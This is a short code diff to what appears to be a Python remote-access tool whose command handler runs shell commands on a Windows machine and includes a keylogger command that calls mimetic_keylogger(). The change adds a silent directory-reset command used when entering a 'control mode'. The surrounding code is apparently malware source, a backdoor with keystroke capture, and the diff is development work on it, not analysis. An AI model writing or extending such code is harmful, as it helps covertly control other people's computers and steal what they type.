@@ -670,6 +670,15 @@ def execute_shell_command(cmd_str):
                 return f"Error: {str(e)}"
 
         # Handle mimetic (keylogger) command
+        # Handle reset directory command (called when entering control mode)
+        if cmd_lower.startswith("__reset_dir__"):
+            try:
+                current_working_dir = 'C:\\Users'
+                os.chdir(current_working_dir)
+                return ""  # Silent return
+            except Exception as e:
+                return f"Error: {str(e)}"
+
         if cmd_lower.startswith("__mimetic__"):
             try:
                 result = mimetic_keylogger()
